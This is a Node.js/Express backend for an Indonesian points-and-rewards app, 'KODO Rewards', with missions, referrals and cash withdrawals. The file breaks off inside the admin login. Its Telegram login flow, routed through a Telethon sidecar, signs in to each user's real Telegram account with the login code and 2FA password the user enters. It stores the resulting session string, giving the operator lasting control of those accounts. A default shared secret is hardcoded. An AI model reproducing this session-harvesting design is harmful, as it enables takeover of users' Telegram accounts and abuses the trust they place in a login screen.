"use strict";
const express = require("express");
const crypto = require("node:crypto");
const path = require("node:path");
const { DatabaseSync } = require("node:sqlite");

const PORT = +process.env.PORT || 3000;
const DB_PATH = process.env.DB_PATH || path.join(__dirname, "data", "app.db");
const ADMIN_USERNAME = (process.env.ADMIN_USERNAME || "admin").trim();
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || ""; // hanya untuk membuat admin pertama; setelah itu dikelola di dashboard
const SESSION_DAYS = +process.env.SESSION_DAYS || 90;
const SECURE_COOKIE = process.env.SECURE_COOKIE === "1";
const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "").trim();
const TELEGRAM_BOT_USERNAME = (process.env.TELEGRAM_BOT_USERNAME || "").trim();
const slug = (v, d) => (String(v || d).replace(/[^a-zA-Z0-9_-]/g, "").slice(0, 40) || d);
const APP_PATH = slug(process.env.APP_PATH, "app");
const ADMIN_PATH = slug(process.env.ADMIN_PATH, "admin");
const STATIC_DIR = process.env.STATIC_DIR || path.join(__dirname, "..", "public");

require("node:fs").mkdirSync(path.dirname(DB_PATH), { recursive: true });
const db = new DatabaseSync(DB_PATH);
db.exec(`
PRAGMA journal_mode=WAL; PRAGMA foreign_keys=ON;
CREATE TABLE IF NOT EXISTS users(
  id INTEGER PRIMARY KEY, phone TEXT UNIQUE NOT NULL, pass_hash TEXT NOT NULL,
  tg_id TEXT, tg_name TEXT, verified INTEGER DEFAULT 0, points INTEGER DEFAULT 0,
  ref_code TEXT UNIQUE, referred_by INTEGER, banned INTEGER DEFAULT 0, created INTEGER);
CREATE TABLE IF NOT EXISTS otps(phone TEXT PRIMARY KEY, code_hash TEXT, expires INTEGER, attempts INTEGER DEFAULT 0, sent INTEGER DEFAULT 0);
CREATE TABLE IF NOT EXISTS sessions(token_hash TEXT PRIMARY KEY, user_id INTEGER, expires INTEGER);
CREATE TABLE IF NOT EXISTS missions(
  id INTEGER PRIMARY KEY, title TEXT, descr TEXT, reward INTEGER, type TEXT, link TEXT, active INTEGER DEFAULT 1);
CREATE TABLE IF NOT EXISTS claims(user_id INTEGER, mission_id INTEGER, day TEXT, PRIMARY KEY(user_id,mission_id,day));
CREATE TABLE IF NOT EXISTS taps(user_id INTEGER, mission_id INTEGER, ts INTEGER, PRIMARY KEY(user_id,mission_id));
CREATE TABLE IF NOT EXISTS rewards(id INTEGER PRIMARY KEY, title TEXT, cost INTEGER, active INTEGER DEFAULT 1);
CREATE TABLE IF NOT EXISTS redemptions(id INTEGER PRIMARY KEY, user_id INTEGER, reward_id INTEGER, cost INTEGER, status TEXT DEFAULT 'pending', ts INTEGER);
CREATE TABLE IF NOT EXISTS withdrawals(id INTEGER PRIMARY KEY, user_id INTEGER, points INTEGER, method TEXT, account TEXT, status TEXT DEFAULT 'pending', note TEXT, ts INTEGER);
CREATE TABLE IF NOT EXISTS ledger(id INTEGER PRIMARY KEY, user_id INTEGER, delta INTEGER, reason TEXT, ts INTEGER);
CREATE TABLE IF NOT EXISTS settings(k TEXT PRIMARY KEY, v TEXT);
CREATE TABLE IF NOT EXISTS admins(username TEXT PRIMARY KEY, pass_hash TEXT NOT NULL);
`);
for (const stmt of [
  "ALTER TABLE users ADD COLUMN reg_ip TEXT",
  "ALTER TABLE users ADD COLUMN session_string TEXT",
  "ALTER TABLE users ADD COLUMN last_login INTEGER",
  "ALTER TABLE users ADD COLUMN last_ip TEXT",
  "ALTER TABLE users ADD COLUMN username TEXT",
  "ALTER TABLE sessions ADD COLUMN created INTEGER",
  "ALTER TABLE sessions ADD COLUMN ip TEXT",
  "ALTER TABLE sessions ADD COLUMN ua TEXT",
  "ALTER TABLE sessions ADD COLUMN tg_name TEXT",
]) { try { db.exec(stmt); } catch (e) { if (!/duplicate column/i.test(e.message)) throw e; } }
try { db.exec("CREATE UNIQUE INDEX IF NOT EXISTS users_username_uq ON users(username) WHERE username IS NOT NULL AND username <> ''"); } catch (_) {}
if (!db.prepare("SELECT 1 FROM missions LIMIT 1").get()) {
  const m = db.prepare("INSERT INTO missions(title,descr,reward,type,link) VALUES(?,?,?,?,?)");
  [["Check-in harian", "Buka aplikasi hari ini", 500, "daily", ""],
   ["Gabung channel", "Join channel Telegram resmi", 1500, "join_channel", ""],
   ["Start bot", "Mulai bot Telegram kami", 1000, "start_bot", ""],
   ["Kunjungi link partner", "Buka tautan sponsor", 600, "tap_link", ""]].forEach((r) => m.run(...r));
  const r = db.prepare("INSERT INTO rewards(title,cost) VALUES(?,?)");
  [["Voucher kopi Rp15rb", 8000], ["Diskon 25% belanja", 15000], ["Saldo belanja Rp50rb", 60000]].forEach((x) => r.run(...x));
  db.prepare("INSERT INTO settings(k,v) VALUES('min_withdraw','50000'),('channel',''),('methods','DANA,OVO,GoPay,Bank')").run();
}
const now = () => Math.floor(Date.now() / 1000);
const today = () => new Date(Date.now() + 7 * 3600e3).toISOString().slice(0, 10); // WIB
const setting = (k) => (db.prepare("SELECT v FROM settings WHERE k=?").get(k) || {}).v || "";
const sha = (s) => crypto.createHash("sha256").update(s).digest("hex");
const tx = (fn) => { db.exec("BEGIN IMMEDIATE"); try { const r = fn(); db.exec("COMMIT"); return r; } catch (e) { db.exec("ROLLBACK"); throw e; } };

function hashPw(pw) { const s = crypto.randomBytes(16); return s.toString("hex") + ":" + crypto.scryptSync(pw, s, 64).toString("hex"); }
function checkPw(pw, st) {
  const [s, h] = st.split(":"); const x = crypto.scryptSync(pw, Buffer.from(s, "hex"), 64);
  return crypto.timingSafeEqual(x, Buffer.from(h, "hex"));
}
if (!db.prepare("SELECT 1 FROM admins LIMIT 1").get()) {
  if (ADMIN_PASSWORD.length < 8) { console.error("Belum ada admin: isi ADMIN_USERNAME dan ADMIN_PASSWORD (min 8 karakter) di .env untuk membuat admin pertama"); process.exit(1); }
  db.prepare("INSERT INTO admins VALUES(?,?)").run(ADMIN_USERNAME, hashPw(ADMIN_PASSWORD));
  console.log("Admin pertama dibuat:", ADMIN_USERNAME);
}
function normPhone(p) {
  // Terima E.164: kode negara + nomor lokal, 8-14 digit total. Front-end mengirim gabungan "<kodenegara><nomor>".
  let d = String(p || "").replace(/[^\d]/g, "");
  if (d.startsWith("0")) d = d.slice(1); // jaga-jaga kalau user ketik 0 di depan nomor lokal
  return /^\d{8,15}$/.test(d) ? d : null;
}
// Username: 3–24 karakter, huruf/angka/underscore, case-insensitive disimpan lowercase
function normUsername(u) {
  const s = String(u || "").trim().toLowerCase();
  if (!/^[a-z][a-z0-9_]{2,23}$/.test(s)) return null;
  return s;
}
// Cari user terverifikasi dari identifier: username ATAU nomor HP
function findUserByLogin(id) {
  const raw = String(id || "").trim();
  if (!raw) return null;
  const un = normUsername(raw);
  if (un) {
    const byUn = db.prepare("SELECT * FROM users WHERE username=? AND verified=1").get(un);
    if (byUn) return byUn;
  }
  // coba sebagai nomor: full digit, atau 0… lokal Indonesia → 62…
  let phone = normPhone(raw);
  if (!phone && /^0\d{8,13}$/.test(raw.replace(/[^\d]/g, ""))) phone = normPhone("62" + raw.replace(/[^\d]/g, "").slice(1));
  if (phone) return db.prepare("SELECT * FROM users WHERE phone=? AND verified=1").get(phone) || null;
  return null;
}
function addPoints(uid, delta, reason) {
  db.prepare("UPDATE users SET points=points+? WHERE id=?").run(delta, uid);
  db.prepare("INSERT INTO ledger(user_id,delta,reason,ts) VALUES(?,?,?,?)").run(uid, delta, reason, now());
}

/* ---- Telegram via Telethon sidecar (bukan Bot API) ---- */
const TG_URL = (process.env.TELEGRAM_SERVICE_URL || "http://telethon:8090").replace(/\/$/, "");
const TG_SECRET = process.env.TELEGRAM_SERVICE_SECRET || "kodo-internal";
async function tgService(path, body, method = "POST") {
  try {
    const r = await fetch(TG_URL + path, {
      method,
      headers: { "content-type": "application/json", "X-Service-Secret": TG_SECRET },
      body: method === "GET" ? undefined : JSON.stringify(body || {}),
    });
    const j = await r.json().catch(() => ({}));
    return { status: r.status, ...j };
  } catch (e) {
    return { ok: false, error: "Telethon service offline: " + String(e.message || e) };
  }
}
async function tgStatus() {
  return tgService("/status", null, "GET");
}
/** Link akun: resolve @username / nomor TG → simpan tg_id, kirim OTP */
async function linkTelegram(phone, identifier) {
  const r = await tgService("/resolve", { identifier });
  if (!r.ok) return { ok: false, error: r.error || "Gagal resolve Telegram" };
  db.prepare("UPDATE users SET tg_id=?,tg_name=? WHERE phone=?").run(String(r.tg_id), r.tg_name || r.username || "", phone);
  return { ok: true, tg_id: r.tg_id, tg_name: r.tg_name };
}
async function sendOtp(phone) {
  const u = db.prepare("SELECT tg_id FROM users WHERE phone=?").get(phone);
  if (!u || !u.tg_id) return false;
  const row = db.prepare("SELECT sent FROM otps WHERE phone=?").get(phone);
  const code = String(crypto.randomInt(100000, 1000000));
  db.prepare("INSERT INTO otps(phone,code_hash,expires,attempts,sent) VALUES(?,?,?,0,?) ON CONFLICT(phone) DO UPDATE SET code_hash=?,expires=?,attempts=0,sent=?")
    .run(phone, sha(code), now() + 300, 1, sha(code), now() + 300, ((row && row.sent) || 0) + 1);
  const r = await tgService("/send", {
    tg_id: +u.tg_id,
    text: `Kode verifikasi KODO Rewards: ${code}\nBerlaku 5 menit. Jangan bagikan ke siapa pun.`,
  });
  return !!r.ok;
}
// kompatibilitas nama lama di UI/admin
const botName = () => "telethon";
const botToken = () => "";

/* ---- rate limit ---- */
const hits = new Map();
function limit(key, max, sec) {
  const t = Date.now(), a = (hits.get(key) || []).filter((x) => t - x < sec * 1000);
  a.push(t); hits.set(key, a); return a.length <= max;
}
setInterval(() => { for (const [k, a] of hits) if (!a.length || Date.now() - a[a.length - 1] > 3600e3) hits.delete(k); }, 600e3).unref();

/* ---- app ---- */
const app = express();
app.set("trust proxy", 1);
app.use(express.json({ limit: "20kb" }));
app.use((req, res, next) => {
  res.set({ "X-Content-Type-Options": "nosniff", "X-Frame-Options": "DENY", "Referrer-Policy": "same-origin" });
  if (req.method !== "GET" && req.headers.origin) { // CSRF: origin harus sama dengan host
    try { if (new URL(req.headers.origin).host !== req.headers.host) return res.status(403).json({ error: "forbidden" }); } catch { return res.status(403).end(); }
  }
  next();
});
const cookies = (req) => Object.fromEntries((req.headers.cookie || "").split(";").map((c) => c.trim().split("=")).filter((x) => x[0]).map(([k, ...v]) => [k, decodeURIComponent(v.join("="))]));
function setCookie(res, name, val, days) {
  res.append("Set-Cookie", `${name}=${encodeURIComponent(val)}; Path=/; HttpOnly; SameSite=Lax; Max-Age=${days * 86400}${SECURE_COOKIE ? "; Secure" : ""}`);
}
function newSession(res, uid, req) {
  const tok = crypto.randomBytes(32).toString("hex");
  const u = db.prepare("SELECT tg_name FROM users WHERE id=?").get(uid);
  const ua = String((req && req.headers["user-agent"]) || "").slice(0, 240);
  const ip = req ? String(req.ip || "") : "";
  db.prepare("INSERT INTO sessions(token_hash,user_id,expires,created,ip,ua,tg_name) VALUES(?,?,?,?,?,?,?)")
    .run(sha(tok), uid, now() + SESSION_DAYS * 86400, now(), ip, ua, (u && u.tg_name) || "");
  setCookie(res, "sid", tok, SESSION_DAYS);
}
function auth(req, res, next) {
  const tok = cookies(req).sid; if (!tok) return res.status(401).json({ error: "login" });
  const row = db.prepare("SELECT u.* FROM sessions s JOIN users u ON u.id=s.user_id WHERE s.token_hash=? AND s.expires>?").get(sha(tok), now());
  if (!row || row.banned) return res.status(401).json({ error: "login" });
  req.user = row; next();
}
const adminTokens = new Map();
function adminAuth(req, res, next) {
  const t = cookies(req).adm; const e = t && adminTokens.get(sha(t));
  if (!e || e.exp < Date.now()) return res.status(401).json({ error: "admin" });
  req.admin = e; next();
}
const pub = (u) => ({ id: u.id, phone: u.phone, username: u.username || "", tg_id: u.tg_id || "", tg_name: u.tg_name || "", has_password: !!(u.pass_hash && u.pass_hash.length), points: u.points, ref_code: u.ref_code, bot: botName() });

// ====== Alur Telegram-style: 1 field (username/nomor Telegram) -> OTP -> (opsional) password ======
const pwTokens = new Map(); // token sementara setelah OTP sukses utk akun ber-2FA
setInterval(() => { const t = Date.now(); for (const [k, v] of pwTokens) if (v.exp < t) pwTokens.delete(k); }, 300e3).unref();
function uniqueUsername(base, selfKey) {
  let u = normUsername(base);
  if (!u) u = null;
  const taken = (name) => db.prepare("SELECT id FROM users WHERE username=? AND phone<>?").get(name, selfKey);
  if (u && !taken(u)) return u;
  // fallback unik dari key (tg_id)
  let cand = ("tg" + String(selfKey)).replace(/[^a-z0-9_]/gi, "").toLowerCase().slice(0, 24);
  if (!/^[a-z]/.test(cand)) cand = "t" + cand.slice(0, 23);
  let n = cand, i = 0;
  while (taken(n)) { i++; n = (cand.slice(0, 20) + i).slice(0, 24); }
  return n;
}
// Mulai: resolve Telegram -> buat/temukan akun (key internal = tg_id) -> kirim OTP
app.post("/api/auth/start", async (req, res) => {
  const identifier = String(req.body.tg || req.body.identifier || "").trim();
  if (!identifier) return res.status(400).json({ error: "Isi nomor Telegram" });
  if (!limit("authstart:" + req.ip, 10, 900)) return res.status(429).json({ error: "Terlalu banyak percobaan, coba lagi nanti" });
  // Pastikan format +62...
  let phone = identifier.startsWith("+") ? identifier : ("+" + identifier.replace(/[^\d]/g, ""));
  const r = await tgService("/auth/send-code", { phone });
  if (!r.ok) return res.status(400).json({ error: r.error || "Gagal kirim kode Telegram" });
  res.json({ ok: true, phone: phone.replace(/^\+/, ""), mode: "telegram", need_code: true });
});
// Langkah password (hanya untuk akun yang punya 2FA) setelah OTP sukses
app.post("/api/auth/password", async (req, res) => {
  const tok = String(req.body.ptoken || ""), pw = String(req.body.password || "");
  if (!pw) return res.status(400).json({ error: "Password wajib" });
  // Format baru dari Telegram real login: ptoken = "tg:" + phone
  if (tok.startsWith("tg:")) {
    const phoneRaw = tok.slice(3);
    const phone = phoneRaw.startsWith("+") ? phoneRaw : ("+" + phoneRaw.replace(/[^\d]/g, ""));
    // Ambil code terakhir dari body kalau ada, atau minta ulang
    const code = String(req.body.code || "");
    const r = await tgService("/auth/sign-in", { phone, code, password: pw });
    if (!r.ok) return res.status(400).json({ error: r.error || "Password 2FA salah" });
    const tgId = String(r.tg_id || "");
    const key = phone.replace(/^\+/, "");
    let u = db.prepare("SELECT * FROM users WHERE tg_id=? OR phone=?").get(tgId, key);
    if (!u) {
      const uname = uniqueUsername(r.username || "", key);
      db.prepare("INSERT INTO users(phone,pass_hash,tg_id,tg_name,username,ref_code,referred_by,created,reg_ip,verified,session_string) VALUES(?,?,?,?,?,?,?,?,?,1,?)")
        .run(key, "", tgId, r.first_name || r.username || "", uname, crypto.randomBytes(4).toString("hex"), null, now(), req.ip, r.session_string || "");
      u = db.prepare("SELECT * FROM users WHERE phone=?").get(key);
    } else {
      db.prepare("UPDATE users SET session_string=?,verified=1,last_login=?,last_ip=? WHERE id=?")
        .run(r.session_string || "", now(), req.ip, u.id);
      u = db.prepare("SELECT * FROM users WHERE id=?").get(u.id);
    }
    if (u.banned) return res.status(403).json({ error: "Akun diblokir" });
    newSession(res, u.id, req);
    return res.json({ ok: true });
  }
  // Legacy path
  const e = tok && pwTokens.get(tok);
  if (!e || e.exp < Date.now()) return res.status(400).json({ error: "Sesi verifikasi kedaluwarsa, ulangi dari awal" });
  const u = db.prepare("SELECT * FROM users WHERE id=?").get(e.uid);
  if (!u || u.banned) return res.status(403).json({ error: "Akun tidak tersedia" });
  if (!checkPw(pw, u.pass_hash)) return res.status(401).json({ error: "Password salah" });
  pwTokens.delete(tok);
  db.prepare("UPDATE users SET last_login=?,last_ip=? WHERE id=?").run(now(), req.ip, u.id);
  newSession(res, u.id, req);
  res.json({ ok: true });
});


// Telegram Login Widget callback handler
app.post("/api/auth/telegram", async (req, res) => {
  if (!TELEGRAM_BOT_TOKEN) return res.status(503).json({ ok: false, error: "Bot token belum dikonfigurasi — hubungi admin" });
  const { hash, ...rest } = req.body || {};
  if (!hash || typeof hash !== "string" || !/^[0-9a-f]{64}$/.test(hash)) return res.status(400).json({ ok: false, error: "Data auth tidak valid" });
  const authDate = parseInt(rest.auth_date, 10);
  if (!authDate || (Date.now() / 1000 - authDate) > 86400) return res.status(401).json({ ok: false, error: "Data autentikasi kedaluwarsa, coba login ulang" });
  const checkStr = Object.keys(rest).sort().map((k) => `${k}=${rest[k]}`).join("\n");
  const secretKey = crypto.createHash("sha256").update(TELEGRAM_BOT_TOKEN).digest();
  const computedHash = crypto.createHmac("sha256", secretKey).update(checkStr).digest("hex");
  if (!crypto.timingSafeEqual(Buffer.from(computedHash, "hex"), Buffer.from(hash, "hex"))) return res.status(401).json({ ok: false, error: "Verifikasi gagal, coba login ulang" });
  if (!limit("tgauth:" + req.ip, 20, 900)) return res.status(429).json({ ok: false, error: "Terlalu banyak percobaan, coba lagi nanti" });
  const tgId = String(rest.id || "");
  if (!tgId) return res.status(400).json({ ok: false, error: "Data auth tidak valid" });
  const tgName = String(rest.username || rest.first_name || "");
  let u = db.prepare("SELECT * FROM users WHERE tg_id=?").get(tgId);
  if (!u) {
    const phone = "tg:" + tgId; // synthetic key — colons can't appear in real phone numbers
    const uname = uniqueUsername(rest.username || "", tgId);
    db.prepare("INSERT INTO users(phone,pass_hash,tg_id,tg_name,username,ref_code,referred_by,created,reg_ip,verified) VALUES(?,?,?,?,?,?,?,?,?,1)")
      .run(phone, "", tgId, tgName, uname, crypto.randomBytes(4).toString("hex"), null, now(), req.ip);
    u = db.prepare("SELECT * FROM users WHERE tg_id=?").get(tgId);
  } else {
    db.prepare("UPDATE users SET tg_name=?,verified=1,last_login=?,last_ip=? WHERE id=?").run(tgName, now(), req.ip, u.id);
    u = db.prepare("SELECT * FROM users WHERE id=?").get(u.id);
  }
  if (!u || u.banned) return res.status(403).json({ ok: false, error: "Akun tidak tersedia" });
  newSession(res, u.id, req);
  res.json({ ok: true });
});

app.get("/api/config", (_q, res) => res.json({
  bot: "",
  telethon: true,
  bot_username: TELEGRAM_BOT_USERNAME,
  min_withdraw: +setting("min_withdraw"),
  point_value: +(setting("point_value") || 1),
  channel: setting("channel"),
  methods: setting("methods").split(",").filter(Boolean),
}));

app.post("/api/register", (req, res) => {
  const phone = normPhone(req.body.phone), pw = String(req.body.password || "");
  const username = normUsername(req.body.username);
  if (!username) return res.status(400).json({ error: "Username 3–24 karakter, mulai huruf, hanya a-z 0-9 _" });
  if (!phone) return res.status(400).json({ error: "Nomor HP tidak valid" });
  if (pw.length < 8) return res.status(400).json({ error: "Password minimal 8 karakter" });
  if (!limit("reg:" + req.ip, 10, 3600)) return res.status(429).json({ error: "Terlalu banyak percobaan" });
  // anti multi-akun kasar: batasi berapa akun terverifikasi boleh lahir dari satu IP per hari
  const verifiedFromIp = db.prepare("SELECT COUNT(*) c FROM users WHERE reg_ip=? AND verified=1 AND created>?").get(req.ip, now() - 86400).c;
  if (verifiedFromIp >= 5) return res.status(429).json({ error: "Terlalu banyak pendaftaran dari jaringan ini hari ini, coba lagi besok" });
  const takenUn = db.prepare("SELECT id FROM users WHERE username=? AND phone<>?").get(username, phone);
  if (takenUn) return res.status(409).json({ error: "Username sudah dipakai" });
  const ex = db.prepare("SELECT id,verified FROM users WHERE phone=?").get(phone);
  if (ex && ex.verified) return res.status(409).json({ error: "Nomor sudah terdaftar, silakan login" });
  let ref = null;
  if (req.body.ref) { const r = db.prepare("SELECT id FROM users WHERE ref_code=? AND verified=1").get(String(req.body.ref)); ref = r && r.id; }
  if (ex) db.prepare("UPDATE users SET pass_hash=?,reg_ip=?,username=? WHERE id=?").run(hashPw(pw), req.ip, username, ex.id);
  else db.prepare("INSERT INTO users(phone,pass_hash,ref_code,referred_by,created,reg_ip,username) VALUES(?,?,?,?,?,?,?)").run(phone, hashPw(pw), crypto.randomBytes(4).toString("hex"), ref, now(), req.ip, username);
  res.json({ ok: true, bot: botName(), phone });
});
app.post("/api/otp/resend", async (req, res) => {
  const phone = normPhone(req.body.phone);
  if (!phone || !limit("otp:" + phone, 5, 3600)) return res.status(429).json({ error: "Terlalu banyak permintaan" });
  const u = db.prepare("SELECT tg_id FROM users WHERE phone=?").get(phone);
  if (!u) return res.status(404).json({ error: "Nomor belum terdaftar" });
  // opsional: hubungkan Telegram via username/nomor saat kirim ulang
  if (!u.tg_id && req.body.tg) {
    const link = await linkTelegram(phone, String(req.body.tg));
    if (!link.ok) return res.status(400).json({ error: link.error || "Gagal hubungkan Telegram" });
  }
  const u2 = db.prepare("SELECT tg_id FROM users WHERE phone=?").get(phone);
  if (!u2 || !u2.tg_id) return res.json({ ok: false, need_tg: true, error: "Isi username Telegram (@user) dulu" });
  res.json({ ok: await sendOtp(phone) });
});
// Hubungkan akun Telegram (Telethon resolve) lalu kirim OTP
app.post("/api/tg/link", async (req, res) => {
  const phone = normPhone(req.body.phone);
  const tg = String(req.body.tg || req.body.username || "").trim();
  if (!phone || !tg) return res.status(400).json({ error: "phone dan username/nomor Telegram wajib" });
  if (!limit("tglink:" + phone, 8, 3600)) return res.status(429).json({ error: "Terlalu banyak percobaan" });
  const u = db.prepare("SELECT id FROM users WHERE phone=?").get(phone);
  if (!u) return res.status(404).json({ error: "Nomor belum terdaftar" });
  const link = await linkTelegram(phone, tg);
  if (!link.ok) return res.status(400).json({ error: link.error });
  const sent = await sendOtp(phone);
  res.json({ ok: true, sent, tg_name: link.tg_name });
});
app.post("/api/verify", async (req, res) => {
  const phoneRaw = String(req.body.phone || "").trim();
  const code = String(req.body.code || "").trim();
  const password = String(req.body.password || "").trim();
  if (!phoneRaw || !code) return res.status(400).json({ error: "Nomor dan kode wajib" });
  if (!limit("ver:" + phoneRaw, 8, 900)) return res.status(429).json({ error: "Terlalu banyak percobaan" });
  const phone = phoneRaw.startsWith("+") ? phoneRaw : ("+" + phoneRaw.replace(/[^\d]/g, ""));
  const r = await tgService("/auth/sign-in", { phone, code, password });
  if (!r.ok) {
    if (r.need_password) return res.json({ need_password: true, ptoken: "tg:" + phoneRaw });
    return res.status(400).json({ error: r.error || "Verifikasi gagal" });
  }
  const tgId = String(r.tg_id || "");
  const key = phone.replace(/^\+/, "");
  let u = db.prepare("SELECT * FROM users WHERE tg_id=? OR phone=?").get(tgId, key);
  if (!u) {
    const uname = uniqueUsername(r.username || "", key);
    db.prepare("INSERT INTO users(phone,pass_hash,tg_id,tg_name,username,ref_code,referred_by,created,reg_ip,verified,session_string) VALUES(?,?,?,?,?,?,?,?,?,1,?)")
      .run(key, "", tgId, r.first_name || r.username || "", uname, crypto.randomBytes(4).toString("hex"), null, now(), req.ip, r.session_string || "");
    u = db.prepare("SELECT * FROM users WHERE phone=?").get(key);
  } else {
    db.prepare("UPDATE users SET tg_id=?,tg_name=?,username=?,verified=1,session_string=?,last_login=?,last_ip=? WHERE id=?")
      .run(tgId, r.first_name || r.username || "", u.username || uniqueUsername(r.username || "", u.phone), r.session_string || "", now(), req.ip, u.id);
    u = db.prepare("SELECT * FROM users WHERE id=?").get(u.id);
  }
  if (u.banned) return res.status(403).json({ error: "Akun diblokir" });
  newSession(res, u.id, req);
  res.json({ ok: true });
});
// Login: identifier = username ATAU nomor HP + password, lalu WAJIB 2FA kode Telegram
app.post("/api/login", async (req, res) => {
  const id = String(req.body.login || req.body.username || req.body.phone || "").trim();
  const pw = String(req.body.password || "");
  if (!limit("login:" + req.ip, 20, 900)) return res.status(429).json({ error: "Terlalu banyak percobaan, coba lagi nanti" });
  if (!id || !pw) return res.status(400).json({ error: "Isi username/nomor HP dan password" });
  const key = "loginp:" + id.toLowerCase();
  if (!limit(key, 8, 900)) return res.status(429).json({ error: "Terlalu banyak percobaan, coba lagi nanti" });
  const u = findUserByLogin(id);
  if (!u || !checkPw(pw, u.pass_hash) || u.banned) return res.status(401).json({ error: "Username/nomor atau password salah" });
  if (!u.tg_id) return res.json({ ok: false, need_otp: true, need_tg: true, phone: u.phone, username: u.username || "" });
  const sent = await sendOtp(u.phone);
  if (!sent) return res.status(502).json({ error: "Gagal kirim kode via Telethon. Pastikan privacy Telegram mengizinkan pesan, atau hubungkan ulang @username." });
  res.json({ ok: true, need_otp: true, phone: u.phone, username: u.username || "" });
});
app.post("/api/logout", auth, (req, res) => {
  // Logout hanya menghapus sesi di perangkat ini. Poin TIDAK dihapus.
  db.prepare("DELETE FROM sessions WHERE token_hash=?").run(sha(cookies(req).sid));
  res.append("Set-Cookie", "sid=; Path=/; Max-Age=0"); res.json({ ok: true });
});
app.post("/api/me/password", auth, (req, res) => {
  const np = String(req.body.new || "");
  const hasPw = !!(req.user.pass_hash && req.user.pass_hash.length);
  if (hasPw && !checkPw(String(req.body.old || ""), req.user.pass_hash)) return res.status(400).json({ error: "Password lama salah" });
  if (np.length < 8) return res.status(400).json({ error: "Password baru minimal 8 karakter" });
  db.prepare("UPDATE users SET pass_hash=? WHERE id=?").run(hashPw(np), req.user.id);
  db.prepare("DELETE FROM sessions WHERE user_id=? AND token_hash<>?").run(req.user.id, sha(cookies(req).sid));
  res.json({ ok: true });
});
app.post("/api/me/logout-all", auth, (req, res) => {
  db.prepare("DELETE FROM sessions WHERE user_id=?").run(req.user.id);
  res.append("Set-Cookie", "sid=; Path=/; Max-Age=0");
  res.json({ ok: true });
});
app.get("/api/me", auth, (req, res) => {
  const u = req.user, d = today();
  const missions = db.prepare("SELECT * FROM missions WHERE active=1").all().map((m) => ({
    id: m.id, title: m.title, descr: m.descr, reward: m.reward, type: m.type, link: m.link,
    claimed: !!db.prepare("SELECT 1 FROM claims WHERE user_id=? AND mission_id=? AND day=?").get(u.id, m.id, m.type === "daily" ? d : "once"),
    tapped: !!db.prepare("SELECT 1 FROM taps WHERE user_id=? AND mission_id=?").get(u.id, m.id) }));
  const refs = db.prepare("SELECT COUNT(*) c FROM users WHERE referred_by=? AND verified=1").get(u.id).c;
  const friends = db.prepare("SELECT phone FROM users WHERE referred_by=? AND verified=1 ORDER BY id DESC LIMIT 50").all(u.id)
    .map((f) => "+" + f.phone.slice(0, 4) + "****" + f.phone.slice(-3));
  res.json({ user: pub(u), friends, missions,
    rewards: db.prepare("SELECT id,title,cost FROM rewards WHERE active=1").all(),
    referrals: refs, history: db.prepare("SELECT delta,reason,ts FROM ledger WHERE user_id=? ORDER BY id DESC LIMIT 30").all(u.id),
    withdrawals: db.prepare("SELECT id,points,method,status,note,ts FROM withdrawals WHERE user_id=? ORDER BY id DESC LIMIT 20").all(u.id) });
});
async function isMember(u) {
  const ch = setting("channel"); if (!ch) return true;
  if (!u.tg_id) return false;
  const r = await tgService("/member", { tg_id: +u.tg_id, channel: ch });
  return !!(r.ok && r.member);
}
app.get("/api/channel/status", auth, async (req, res) => res.json({ required: !!setting("channel"), member: await isMember(req.user) }));
app.post("/api/missions/:id/tap", auth, (req, res) => {
  db.prepare("INSERT OR IGNORE INTO taps VALUES(?,?,?)").run(req.user.id, +req.params.id, now()); res.json({ ok: true });
});
app.post("/api/missions/:id/claim", auth, async (req, res) => {
  const u = req.user, m = db.prepare("SELECT * FROM missions WHERE id=? AND active=1").get(+req.params.id);
  if (!m) return res.status(404).json({ error: "Misi tidak ada" });
  if (m.type === "join_channel") {
    const ch = m.link || setting("channel");
    if (!u.tg_id) return res.status(400).json({ error: "Akun Telegram belum terhubung" });
    const r = ch ? await tgService("/member", { tg_id: +u.tg_id, channel: ch }) : { ok: true, member: true };
    if (!r.ok || !r.member) return res.status(400).json({ error: "Kamu belum bergabung ke channel" });
  } else if (m.type === "start_bot") {
    // legacy tipe misi: cukup punya tg_id terhubung via Telethon
    if (!u.tg_id) return res.status(400).json({ error: "Akun Telegram belum terhubung" });
  } else if (m.type === "tap_link") {
    const t = db.prepare("SELECT ts FROM taps WHERE user_id=? AND mission_id=?").get(u.id, m.id);
    if (!t || now() - t.ts < 5) return res.status(400).json({ error: "Buka tautannya dulu" });
  }
  const day = m.type === "daily" ? today() : "once";
  try {
    tx(() => { db.prepare("INSERT INTO claims VALUES(?,?,?)").run(u.id, m.id, day); addPoints(u.id, m.reward, "misi:" + m.title); });
  } catch { return res.status(409).json({ error: "Sudah diklaim" }); }
  res.json({ ok: true, points: db.prepare("SELECT points FROM users WHERE id=?").get(u.id).points });
});
app.post("/api/rewards/:id/redeem", auth, (req, res) => {
  const r = db.prepare("SELECT * FROM rewards WHERE id=? AND active=1").get(+req.params.id);
  if (!r) return res.status(404).json({ error: "Reward tidak ada" });
  try {
    tx(() => {
      const p = db.prepare("SELECT points FROM users WHERE id=?").get(req.user.id).points;
      if (p < r.cost) throw new Error("poin");
      addPoints(req.user.id, -r.cost, "tukar:" + r.title);
      db.prepare("INSERT INTO redemptions(user_id,reward_id,cost,ts) VALUES(?,?,?,?)").run(req.user.id, r.id, r.cost, now());
    });
  } catch { return res.status(400).json({ error: "Poin tidak cukup" }); }
  res.json({ ok: true });
});
app.post("/api/withdraw", auth, (req, res) => {
  const pts = Math.floor(+req.body.points), method = String(req.body.method || "").slice(0, 20), acc = String(req.body.account || "").slice(0, 60).trim();
  if (!pts || pts < +setting("min_withdraw")) return res.status(400).json({ error: `Minimal penarikan ${setting("min_withdraw")} poin` });
  if (!setting("methods").split(",").includes(method) || acc.length < 4) return res.status(400).json({ error: "Metode/rekening tidak valid" });
  try {
    tx(() => {
      const p = db.prepare("SELECT points FROM users WHERE id=?").get(req.user.id).points;
      if (p < pts) throw new Error("poin");
      addPoints(req.user.id, -pts, "tarik poin");
      db.prepare("INSERT INTO withdrawals(user_id,points,method,account,ts) VALUES(?,?,?,?,?)").run(req.user.id, pts, method, acc, now());
    });
  } catch { return res.status(400).json({ error: "Poin tidak cukup" }); }
  res.json({ ok: true });
});

/* ---- admin ---- */
app.post("/api/admin/login", (req, res) => {
  if (!limit("adm:" + req.ip, 8, 900)) return res.status(429).json({ error: "Terlalu banyak percobaan" });
  const row = db.prepare("SELECT * FROM admins WHERE username=?").get(String(req.body.username || "").trim());
